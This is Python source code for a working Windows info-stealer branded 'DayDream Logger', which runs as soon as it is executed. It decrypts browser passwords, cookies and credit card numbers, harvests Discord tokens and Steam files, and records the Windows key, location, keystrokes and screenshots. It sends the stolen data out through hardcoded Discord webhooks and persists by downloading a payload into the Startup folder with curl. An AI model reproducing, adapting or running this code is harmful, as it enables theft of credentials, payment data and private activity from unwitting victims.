import os
import sys
from base64 import b64decode
from datetime import datetime, timedelta
import json
from os import getenv, listdir, remove, mkdir
from os.path import join, exists, abspath
from random import choice
from re import findall
from shutil import copy2, rmtree
from sqlite3 import connect
from string import ascii_letters
from time import sleep
from inspect import getsourcefile
import time

from Crypto.Cipher import AES
from discord_webhook import DiscordWebhook, DiscordEmbed
from pyzipper import AESZipFile, ZIP_DEFLATED, WZ_AES
from requests import get
from win32crypt import CryptUnprotectData
import pyautogui
import threading
import keyboard
import requests
import winshell
import subprocess
import getmac
import psutil
import httpx

global executableUrl, executableName
global pythonUrl, pythonName
global requirements
requirementString = "altgraph;autopep8;certifi;charset-normalizer;colorama;discord-webhook;future;get-mac;httpx;idna;keyboard;pefile;Pillow;psutil;PyAutoGUI;pycodestyle;pycryptodome;pycryptodomex;pyinstaller;pyinstaller-hooks-contrib;pystyle;pywin32;pywin32-ctypes;pyzipper;requests;toml;urllib3;winshell;win32-bridge;win32-setctime;win32-setfiletime;"
executableUrl = ""
executableName = "test12"
pythonUrl = ""
pythonName = "test12"
requirements = requirementString.split(";")


def getCurrentFile() -> str:
    return __file__


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print(str(e))


def get_size(byteData, suffix="B"):
    factor = 1024
    for unit in ["", "K", "M", "G", "T", "P"]:
        if byteData < factor:
            return f"{byteData:.2f}{unit}{suffix}"
        byteData /= factor


class DayDream:

    def win_decrypt(self, encrypted_str: bytes) -> str:
        return CryptUnprotectData(encrypted_str, None, None, None, 0)[1]

    def system_info(self) -> list:
        flag = 0x08000000
        sh1 = "wmic csproduct get uuid"
        sh2 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform' -Name BackupProductKeyDefault"
        sh3 = "powershell Get-ItemPropertyValue -Path 'HKLM:SOFTWARE\Microsoft\Windows NT\CurrentVersion' -Name ProductName"
        try:
            HWID = subprocess.check_output(sh1, creationflags=flag).decode().split('\n')[1].strip()
        except Exception:
            HWID = "N/A"
        try:
            wkey = subprocess.check_output(sh2, creationflags=flag).decode().rstrip()
        except Exception:
            wkey = "N/A"
        try:
            winver = subprocess.check_output(sh3, creationflags=flag).decode().rstrip()
        except Exception:
            winver = "N/A"
        return [HWID, winver, wkey]

    def network_info(self) -> list:
        ip, city, country, region, org, loc, googlemap = "None", "None", "None", "None", "None", "None", "None"
        req = httpx.get("https://ipinfo.io/json")
        if req.status_code == 200:
            data = req.json()
            ip = data.get('ip')
            city = data.get('city')
            country = data.get('country')
            region = data.get('region')
            org = data.get('org')
            loc = data.get('loc')
            googlemap = "https://www.google.com/maps/search/google+map++" + loc
        return [ip, city, country, region, org, loc, googlemap]

    def getMasterKey(self, path: str) -> str:
        copy2(path, join(self.temp, "ewerjwerjkn231rjkn"))
        with open(join(self.temp, "ewerjwerjkn231rjkn"), "r", encoding="utf-8") as file:
            localState = file.read()
            localState = json.loads(localState)
        masterKey = b64decode(localState["os_crypt"]["encrypted_key"])
        masterKey = masterKey[5:]
        masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]
        remove(join(self.temp, "ewerjwerjkn231rjkn"))
        return masterKey

    def getChromeMasterKey(self) -> None:
        with open(join(self.localAppData, "Google", "Chrome", "User Data", "Local State"), "r") as file:
            localState = file.read()
            localState = json.loads(localState)

        masterKey = b64decode(localState["os_crypt"]["encrypted_key"])
        masterKey = masterKey[5:]
        masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]

        return masterKey

    def getChromeCookies(self) -> None:
        chromeLocation = join(getenv("LOCALAPPDATA"),
                              "Google", "Chrome", "User Data")
        possibleLocations = ["Default", "Guest Profile"]

        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possibleLocations.append(directoryName)

        cookiesFile = open(
            join(self.mainDirectory, "ChromeCookies.txt"), "a")
        cookiesFile.write(
            "Chrome Cookies\n")

        for location in possibleLocations:
            try:
                databasePath = join(
                    chromeLocation, location, "Network", "Cookies")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT name, path, encrypted_value FROM cookies")

                    for r in databaseCursor.fetchall():
                        name = r[0]
                        path = r[1]
                        decryptedValue = self.decryptValue(
                            r[2], self.getChromeMasterKey())

                        cookiesFile.write(f"""
==========================================
Cookie Name: {name}
Cookie Path: {path}
Decrypted Cookie: {decryptedValue}
==========================================
                        """)
                except BaseException:
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        cookiesFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getChromeCards(self) -> None:
        chromeLocation = join(self.localAppData,
                              "Google", "Chrome", "User Data")
        possibleLocations = ["Default", "Guest Profile"]
        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possibleLocations.append(directoryName)

        cardsFile = open(
            join(self.mainDirectory, "ChromeCards.txt"), "a")
        cardsFile.write(
            "Chrome Credit Cards\n")

        for location in possibleLocations:
            try:
                databasePath = join(chromeLocation, location, "Web Data")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")

                    for r in databaseCursor.fetchall():
                        nameOnCard = r[0]
                        expirationMonth = r[1]
                        expirationYear = r[2]
                        decryptedCardNumber = self.decryptValue(
                            r[3], self.getChromeMasterKey())

                        cardsFile.write(f"""
==========================================
Name On Card: {nameOnCard}
Expiration Year: {expirationYear}
Expiration Month: {expirationMonth}
Decrypted Card Number: {decryptedCardNumber}
==========================================
                        """)
                except Exception as ex:
                    print(ex)
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        cardsFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getChromePasswords(self) -> None:
        chromeLocation = join(self.localAppData,
                              "Google", "Chrome", "User Data")
        possibleLocations = ["Default", "Guest Profile"]
        for directoryName in listdir(chromeLocation):
            if "Profile " in directoryName:
                possibleLocations.append(directoryName)

        passwordsFile = open(
            join(self.mainDirectory, "ChromePasswords.txt"), "a")
        passwordsFile.write(
            "Chrome Passwords\n")

        for possibleLocation in possibleLocations:
            try:
                databasePath = join(
                    chromeLocation, possibleLocation, "Login Data")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT action_url, username_value, password_value, origin_url, date_last_used FROM logins")

                    for r in databaseCursor.fetchall():
                        url = r[0]
                        username = r[1]
                        decryptedPassword = self.decryptValue(
                            r[2], self.getChromeMasterKey())
                        originUrl = r[3]
                        dateLastUsed = ""

                        try:
                            dateLastUsed = datetime(
                                1601, 1, 1) + timedelta(microseconds=r[4])
                        except BaseException:
                            pass

                        passwordsFile.write(f"""
==========================================#
Action URL: {url}
Origin URL: {originUrl}
Username: {username}
Decrypted Password: {decryptedPassword}
Date last Used: {dateLastUsed}
==========================================#
                    """)

                except BaseException:
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        passwordsFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getBrowserMasterKey(self, path: str) -> None:
        with open(join(path, "Local State"), "r") as file:
            localState = file.read()
            localState = json.loads(localState)

        masterKey = b64decode(localState["os_crypt"]["encrypted_key"])
        masterKey = masterKey[5:]
        masterKey = CryptUnprotectData(masterKey, None, None, None, 0)[1]

        return masterKey

    def getBrowserCookies(self, name: str, path: str, checkProfiles: bool) -> None:
        browserLocation = path
        possibleLocations = []
        if (checkProfiles):
            possibleLocations.append(join(browserLocation, "Default"))
            possibleLocations.append(join(browserLocation, "Guest Profile"))

            for directoryName in listdir(browserLocation):
                if "Profile " in directoryName:
                    possibleLocations.append(join(browserLocation, directoryName))
        else:
            possibleLocations.append(browserLocation)

        cookiesFile = open(
            join(self.mainDirectory, name.replace(" ", "-") + "Cookies.txt"), "a")
        cookiesFile.write(
            name + " Cookies\n")

        for location in possibleLocations:
            try:
                databasePath = join(
                    location, "Network", "Cookies")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT name, path, encrypted_value FROM cookies")

                    for r in databaseCursor.fetchall():
                        name = r[0]
                        path = r[1]
                        decryptedValue = self.decryptValue(
                            r[2], self.getBrowserMasterKey(name, path))

                        cookiesFile.write(f"""
==========================================
Cookie Name: {name}
Cookie Path: {path}
Decrypted Cookie: {decryptedValue}
==========================================
                        """)
                except BaseException:
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        cookiesFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getBrowserCards(self, name: str, path: str, checkProfiles: bool) -> None:
        browserLocation = path
        possibleLocations = []
        if (checkProfiles):
            possibleLocations.append(join(browserLocation, "Default"))
            possibleLocations.append(join(browserLocation, "Guest Profile"))

            for directoryName in listdir(browserLocation):
                if "Profile " in directoryName:
                    possibleLocations.append(join(browserLocation, directoryName))
        else:
            possibleLocations.append(browserLocation)

        cardsFile = open(
            join(self.mainDirectory, name.replace(" ", "-") + "Cards.txt"), "a")
        cardsFile.write(
            name + " Credit Cards\n")

        for location in possibleLocations:
            try:
                databasePath = join(location, "Web Data")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards")

                    for r in databaseCursor.fetchall():
                        nameOnCard = r[0]
                        expirationMonth = r[1]
                        expirationYear = r[2]
                        decryptedCardNumber = self.decryptValue(
                            r[3], self.getBrowserMasterKey(name, path))

                        cardsFile.write(f"""
==========================================
Name On Card: {nameOnCard}
Expiration Year: {expirationYear}
Expiration Month: {expirationMonth}
Decrypted Card Number: {decryptedCardNumber}
==========================================
                        """)
                except Exception as ex:
                    print(ex)
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        cardsFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getBrowserPasswords(self, name: str, path: str, checkProfiles: bool) -> None:
        browserLocation = path
        possibleLocations = []
        if (checkProfiles):
            possibleLocations.append(join(browserLocation, "Default"))
            possibleLocations.append(join(browserLocation, "Guest Profile"))

            for directoryName in listdir(browserLocation):
                if "Profile " in directoryName:
                    possibleLocations.append(join(browserLocation, directoryName))
        else:
            possibleLocations.append(browserLocation)

        passwordsFile = open(
            join(self.mainDirectory, name + "Passwords.txt"), "a")
        passwordsFile.write(
            name.replace(" ", "-") + " Passwords\n")

        for possibleLocation in possibleLocations:
            try:
                databasePath = join(
                    possibleLocation, "Login Data")
                tempDatabasePath = join(getenv("TEMP"), "".join(
                    choice(ascii_letters) for i in range(15)))

                copy2(databasePath, tempDatabasePath)

                databaseConnection = connect(tempDatabasePath)
                databaseCursor = databaseConnection.cursor()

                try:
                    databaseCursor.execute(
                        "SELECT action_url, username_value, password_value, origin_url, date_last_used FROM logins")

                    for r in databaseCursor.fetchall():
                        url = r[0]
                        username = r[1]
                        decryptedPassword = self.decryptValue(
                            r[2], self.getChromeMasterKey())
                        originUrl = r[3]
                        dateLastUsed = ""

                        try:
                            dateLastUsed = datetime(
                                1601, 1, 1) + timedelta(microseconds=r[4])
                        except BaseException:
                            pass

                        passwordsFile.write(f"""
==========================================#
Action URL: {url}
Origin URL: {originUrl}
Username: {username}
Decrypted Password: {decryptedPassword}
Date last Used: {dateLastUsed}
==========================================#
                    """)

                except BaseException:
                    pass
            except BaseException:
                pass

        databaseCursor.close()
        databaseConnection.close()
        passwordsFile.close()

        try:
            remove(tempDatabasePath)
            sleep(0.2)
        except BaseException:
            pass

    def getTokens(self) -> None:
        for _, path in self.paths.items():
            if not exists(path):
                continue
            try:
                if "discord" not in path:
                    for fileName in listdir(path):
                        if not fileName.endswith(
                                ".log") and not fileName.endswith(".ldb"):
                            continue
                        for line in [
                            x.strip() for x in open(
                                f'{path}\\{fileName}',
                                errors='ignore').readlines() if x.strip()]:
                            for regex in (self.normalRegex):
                                for token in findall(regex, line):
                                    if (self.checkToken(token)):
                                        if token not in self.tokens:
                                            self.tokens.append(token)
                else:
                    if exists(join(self.appData, "discord", "Local State")):
                        for fileName in listdir(path):
                            if not fileName.endswith(
                                    ".log") and not fileName.endswith(".ldb"):
                                continue
                            for line in [
                                x.strip() for x in open(
                                    f'{path}\\{fileName}',
                                    errors='ignore').readlines() if x.strip()]:
                                for y in findall(self.encryptedRegex, line):
                                    token = self.decryptValue(b64decode(y[:y.find('"')].split(
                                        'dQw4w9WgXcQ:')[1]), self.getMasterKey(
                                        join(self.appData, "discord", "Local State")))

                                    if (self.checkToken(token)):
                                        if token not in self.tokens:
                                            self.tokens.append(token)
            except BaseException:
                pass

        for token in self.tokens:
            self.addTokenData(token)

    def addInfoEmbed(self) -> None:
        mac = getmac.get_mac_address()
        ram = str(psutil.virtual_memory()[0] / 1024 ** 3).split(".")[0]
        disk = str(psutil.disk_usage('/')[0] / 1024 ** 3).split(".")[0]
        userName = getenv("USERNAME")
        hostName = getenv("COMPUTERNAME")
        infoEmbed = DiscordEmbed(
            title="DayDream Logger | New hit! 🌙", color=8134084)
        infoEmbed.add_embed_field(
            name="Computer Information",
            value=f"""IP Address: ||`{self.ip}`||
            MAC Address: ||`{mac}`||
            Username: `{userName}`
            Computer Name: `{hostName}`
            Windows key: ||`{self.winkey}`||
            Windows version: `{self.winver}`
            RAM: `{ram} GB`
            DISK: `{disk} GB`
            HWID: `{self.hwid}`""",
            inline=False)
        infoEmbed.add_embed_field(
            name="Location Information",
            value=f"""City: `{self.city}`
            Region: `{self.region}`
            Country: `{self.country}`
            Org: `{self.org}`
            Location: `{self.loc}`
            GoogleMaps: `{self.googlemap}`""",
            inline=False)
        infoEmbed.add_embed_field(
            name="Password",
            value=f"Zip Archive Decryption Password: ||`{self.password}`||",
            inline=False)
        infoEmbed.set_footer(
            text="DayDream Logger V1 | Stealing data since 1989 🌙")
        self.webHook.add_embed(infoEmbed)

    def addTokenData(self, token: str) -> None:
        data = get('https://discordapp.com/api/v9/users/@me',
                   headers={"Authorization": token}).json()

        tokenEmbed = DiscordEmbed(
            title=f"{data['username']}#{data['discriminator']} ({data['id']})",
            color=8134084)

        tokenEmbed.add_embed_field(
            name=f"Token Data",
            value=f"""```Public Flags: {data['public_flags']}
            Flags: {data['flags']}
            Banner Color: {data['banner_color']}
            Accent Color: {data['accent_color']}
            Locale: {data['locale']}
            NSFW Allowed: {data['nsfw_allowed']}
            MFA Enabled: {data['mfa_enabled']}\nEmail: {data['email']}\nVerified: {data['verified']}
            Phone #: {data['phone']}```""")
        tokenEmbed.add_embed_field(
            name="Token", value=f"[||{token}||]", inline=False)
        tokenEmbed.set_image(
            url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['banner']}.png")
        tokenEmbed.set_thumbnail(
            url=f"https://cdn.discordapp.com/avatars/{data['id']}/{data['avatar']}.png")
        tokenEmbed.set_footer(
            text="DayDream Logger V1 | Stealing data since 1989 🌙")
        tokenEmbed.set_url(f"https://discord.com/users/{data['id']}")
        self.webHook.add_embed(embed=tokenEmbed)

    def checkToken(self, token: str) -> str:
        if get("https://discord.com/api/v9/auth/login",
               headers={"Authorization": token}).status_code == 200:
            return True
        else:
            return False

    def decryptValue(self, buff: str, masterKey: str) -> str:
        try:
            payload = buff[15:]
            cipher = AES.new(masterKey, AES.MODE_GCM, buff[3:15])
            return cipher.decrypt(payload)[:-16].decode()
        except BaseException:
            return ""

    def getChromeData(self) -> None:
        try:
            self.getChromePasswords()
        except BaseException:
            pass
        try:
            self.getChromeCookies()
        except BaseException:
            pass
        try:
            self.getChromeCards()
        except BaseException:
            pass
        zipFile = AESZipFile(
            join(
                self.temp,
                f"{self.mainId}.zip"),
            'w',
            compression=ZIP_DEFLATED,
            encryption=WZ_AES)
        zipFile.pwd = bytes(self.password, encoding="utf-8")
        folderContents = listdir(self.mainDirectory)
        for fileName in folderContents:
            absolutePath = join(self.mainDirectory, fileName)
            zipFile.write(absolutePath, fileName)
        zipFile.close()
        with open(join(self.temp, f"{self.mainId}.zip"), "rb") as file:
            self.webHook.add_file(file=file.read(), filename="ChromeData.zip")
        rmtree(self.mainDirectory)
        remove(join(self.temp, f"{self.mainId}.zip"))

    def getBrowserData(self, name: str, path: str, checkProfiles: bool) -> None:
        try:
            self.getBrowserPasswords(name, path, checkProfiles)
        except BaseException:
            pass
        try:
            self.getBrowserCookies(name, path, checkProfiles)
        except BaseException:
            pass
        try:
            self.getBrowserCards(name, path, checkProfiles)
        except BaseException:
            pass

    def sendBrowserData(self) -> None:
        zipFile = AESZipFile(
            join(
                self.temp,
                f"{self.mainId}.zip"),
            'w',
            compression=ZIP_DEFLATED,
            encryption=WZ_AES)
        zipFile.pwd = bytes(self.password, encoding="utf-8")
        folderContents = listdir(self.mainDirectory)
        for fileName in folderContents:
            absolutePath = join(self.mainDirectory, fileName)
            zipFile.write(absolutePath, fileName)
        zipFile.close()
        with open(join(self.temp, f"{self.mainId}.zip"), "rb") as file:
            self.webHook.add_file(file=file.read(), filename=getenv("USERNAME") + "-BrowserData.zip")
        remove(join(self.temp, f"{self.mainId}.zip"))

    def loopScreenshots(self) -> None:
        while True:
            self.sendScreenshot()
            sleep(float("10"))

    def sendScreenshot(self) -> None:
        imgName = time.strftime("%Y%m%d-%H%M%S.jpg")
        imgPath = join(self.temp, imgName)
        img = pyautogui.screenshot(imgPath)
        with open(imgPath, "rb") as file:
            self.screenWebHook.add_file(file=file.read(), filename=imgName)
        self.screenWebHook.execute(remove_files=True)
        remove(imgPath)

    def loopKeyLogger(self) -> None:
        while True:
            self.recordKeys()

    def recordKeys(self) -> None:
        record = keyboard.record(until='enter')
        keySender = KeySender(self, record)
        threading.Thread(target=keySender.sendKeys, daemon=False).start()

    def installModules(self) -> None:
        global requirements
        for requirement in requirements:
            os.popen(f"pip install {requirement} &")

    def loadToStartup(self) -> None:
        global executableUrl, executableName, pythonUrl, pythonName
        if executableUrl:
            try:
                # folderPath = join(self.appData, 'Microsoft', 'Windows', 'Start Menu') #'Programs' 'Startup'
                # for f in listdir(folderPath):
                #     if f.lower().startswith("program"):
                #         folderPath = join(folderPath, f, 'Startup')
                #         break
                folderPath = str(winshell.startup())
                os.popen(f"cd {folderPath} && curl -s -f -o {executableName}.exe {executableUrl} &")
                # ts = time.time()-1000*3600*24*30
                # win32_setfiletime.setctime(join(folderPath, f"{executableName}.exe"), ts)
                # win32_setfiletime.setatime(join(folderPath, f"{executableName}.exe"), ts)
                # win32_setfiletime.setmtime(join(folderPath, f"{executableName}.exe"), ts)
            except BaseException as err:
                embed = DiscordEmbed(title="DayDream Logger | Error! :x:", color=8134084)
                embed.add_embed_field(
                    name="Execution",
                    value="Could not load to startup")
                embed.add_embed_field(
                    name="Error Message",
                    value=str(err))
                self.webHook.add_embed(embed)
        if pythonUrl:
            try:
                # folderPath = join(self.appData, 'Microsoft', 'Windows', 'Start Menu') #'Programs' 'Startup'
                # for f in listdir(folderPath):
                #     if f.lower().startswith("program"):
                #         folderPath = join(folderPath, f, 'Startup')
                #         break
                folderPath = str(winshell.startup())
                os.popen(f"cd {folderPath} && curl -s -f -o {pythonName}.py {pythonUrl} &")
                # ts = time.time()-1000*3600*24*30
                # win32_setfiletime.setctime(join(folderPath, f"{executableName}.exe"), ts)
                # win32_setfiletime.setatime(join(folderPath, f"{executableName}.exe"), ts)
                # win32_setfiletime.setmtime(join(folderPath, f"{executableName}.exe"), ts)
            except BaseException as err:
                embed = DiscordEmbed(title="DayDream Logger | Error! :x:", color=8134084)
                embed.add_embed_field(
                    name="Execution",
                    value="Could not load to startup")
                embed.add_embed_field(
                    name="Error Message",
                    value=str(err))
                self.webHook.add_embed(embed)

    def grabSteam(self) -> None:
        try:
            steam = join(self.temp, 'Steam')
            os.makedirs(steam, exist_ok=True)
            mc = r"C:\Program Files (x86)\Steam"
            for root, dirs, files in os.walk(mc):
                for _file in files:
                    if _file.startswith("ssfn"):
                        copy2(join(mc, _file), steam)

            zipFile = AESZipFile(
                join(
                    self.temp,
                    f"{self.mainId}steam.zip"),
                'w',
                compression=ZIP_DEFLATED,
                encryption=WZ_AES)
            zipFile.pwd = bytes(self.password, encoding="utf-8")
            folderContents = listdir(steam)
            for fileName in folderContents:
                absolutePath = join(steam, fileName)
                zipFile.write(absolutePath, fileName)
            zipFile.close()
            with open(join(self.temp, f"{self.mainId}steam.zip"), "rb") as file:
                self.webHook.add_file(file=file.read(), filename=getenv("USERNAME") + "-SteamData.zip")
            remove(join(self.temp, f"{self.mainId}steam.zip"))

            rmtree(steam)
        except BaseException as err:
            embed = DiscordEmbed(title="DayDream Logger | Error! :x:", color=8134084)
            embed.add_embed_field(
                name="Execution",
                value="Could not grab Steam")
            embed.add_embed_field(
                name="Error Message",
                value=str(err))
            self.webHook.add_embed(embed)
            pass

    def __init__(self) -> None:
        self.appData = getenv("APPDATA")
        self.localAppData = getenv("LOCALAPPDATA")
        self.paths = {
            'Discord': self.appData + r'\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.appData + r'\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.appData + r'\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.appData + r'\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.appData + r'\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.appData + r'\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Amigo': self.localAppData + r'\\Amigo\\User Data\\Local Storage\\leveldb\\',
            'Torch': self.localAppData + r'\\Torch\\User Data\\Local Storage\\leveldb\\',
            'Kometa': self.localAppData + r'\\Kometa\\User Data\\Local Storage\\leveldb\\',
            'Orbitum': self.localAppData + r'\\Orbitum\\User Data\\Local Storage\\leveldb\\',
            'CentBrowser': self.localAppData + r'\\CentBrowser\\User Data\\Local Storage\\leveldb\\',
            '7Star': self.localAppData + r'\\7Star\\7Star\\User Data\\Local Storage\\leveldb\\',
            'Sputnik': self.localAppData + r'\\Sputnik\\Sputnik\\User Data\\Local Storage\\leveldb\\',
            'Vivaldi': self.localAppData + r'\\Vivaldi\\User Data\\Default\\Local Storage\\leveldb\\',
            'Chrome SxS': self.localAppData + r'\\Google\\Chrome SxS\\User Data\\Local Storage\\leveldb\\',
            'Chrome': self.localAppData + r'\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
            'Epic Privacy Browser': self.localAppData + r'\\Epic Privacy Browser\\User Data\\Local Storage\\leveldb\\',
            'Microsoft Edge': self.localAppData + r'\\Microsoft\\Edge\\User Data\\Defaul\\Local Storage\\leveldb\\',
            'Uran': self.localAppData + r'\\uCozMedia\\Uran\\User Data\\Default\\Local Storage\\leveldb\\',
            'Yandex': self.localAppData + r'\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Brave': self.localAppData + r'\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb\\',
            'Iridium': self.localAppData + r'\\Iridium\\User Data\\Default\\Local Storage\\leveldb\\'}
        self.tokens = []
        self.temp = getenv("TEMP")

        inf, net = self.system_info(), self.network_info()
        self.hwid, self.winver, self.winkey = inf[0], inf[1], inf[2]
        self.ip, self.city, self.country, self.region, self.org, self.loc, self.googlemap = net[0], net[1], net[2], net[3], net[4], net[5], net[6]

        self.encryptedRegex = r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$]*"
        self.normalRegex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"
        self.webHook = DiscordWebhook(
            url="https://discord.com/api/webhooks/1019707093734916127/PlOJsSKiVCjSKT83W66bGME7XCQ_Xh8jCSCXATMO04TFbKpO0HfhmNo4kcegUn2t90QX",
            username="DayDream Logger | V1 🌙 (Logging " + getenv("USERNAME") + ")")
        self.screenWebHook = DiscordWebhook(
            url="https://discord.com/api/webhooks/1019707342645907507/oN4qHL2xlHs0KgwhHPQZsk_vav_EpZjGK0K01PvSm1wfB_8XRc2RWpKtosjQduVbTwzy",
            username="DayDream Screenshot | V1 🌙 (Logging " + getenv("USERNAME") + ")")
        self.keyWebHook = DiscordWebhook(
            url="https://discord.com/api/webhooks/1019707131219410944/Ar85MadU1REkjhXGLDY-9YScW2KpOI2h_TucA0zzATXRx-u3GrgwoXKSbfCGijR1lfyr",
            username="DayDream Key Logger | V1 🌙 (Logging " + getenv("USERNAME") + ")")
        self.installModules()
        self.loadToStartup()

        self.screenshotThread = threading.Thread(target=self.loopScreenshots, daemon=False, name="Screenshots")
        self.keyloggerThread = threading.Thread(target=self.loopKeyLogger, daemon=False, name="KeyLogger")
        self.keyloggerThread.start()
        self.screenshotThread.start()

        self.mainId = "".join(
            choice(ascii_letters) for x in range(8))
        self.password = "".join(
            choice(ascii_letters) for x in range(8))
        self.mainDirectory = join(self.temp, self.mainId)
        mkdir(self.mainDirectory)
        # try:
        #    self.getChromeData()
        # except BaseException:
        #    pass
        try:
            self.getBrowserData("Chrome", join(getenv("LOCALAPPDATA"),
                                               "Google", "Chrome", "User Data"), True)
        except BaseException:
            pass
        try:
            self.getBrowserData("Brave", join(getenv("LOCALAPPDATA"),
                                              "BraveSoftware", "Brave-Browser", "User Data"), True)
        except BaseException:
            pass
        try:
            self.getBrowserData("Opera", join(getenv("APPDATA"),
                                              "Opera Software", "Opera Stable"), False)
        except BaseException:
            pass
        try:
            self.getBrowserData("Opera-GX", join(getenv("APPDATA"),
                                                 "Opera Software", "Opera GX Stable"), False)
        except BaseException:
            pass
        try:
            self.getBrowserData("MS-Edge", join(getenv("LOCALAPPDATA"),
                                                "Microsoft", "Edge", "User Data"), True)
        except BaseException:
            pass
        self.addInfoEmbed()
        self.getTokens()
        self.sendBrowserData()
        try:
            self.grabSteam()
        except BaseException:
            pass
        try:
            rmtree(self.mainDirectory)
        except BaseException:
            pass
        self.webHook.execute()


class KeySender:
    def sendKeys(self):
        fileName = "keys".join(
            choice(ascii_letters) for x in range(4)).join(".txt")
        keysFile = open(
            join(self.parent.temp, fileName), "a")
        keysFile.write("+ = down\n")
        keysFile.write("- = up\n")
        keysFile.write("type name scan_code\n")
        for event in self.record:
            if event.event_type == 'down':
                keysFile.write("+ " + event.name + " (" + str(event.scan_code) + ")\n")
            elif event.event_type == 'up':
                keysFile.write("- " + event.name + " (" + str(event.scan_code) + ")\n")
            else:
                keysFile.write(event.event_type + " " + event.name + " (" + str(event.scan_code) + ")\n")
        keysFile.close()
        with open(join(self.parent.temp, fileName), "rb") as file:
            self.parent.keyWebHook.add_file(file=file.read(), filename="keys.txt")
        self.parent.keyWebHook.execute(remove_files=True)
        remove(join(self.parent.temp, fileName))

    def __init__(self, parent: DayDream, record: list):
        self.parent = parent
        self.record = record


DayDream()
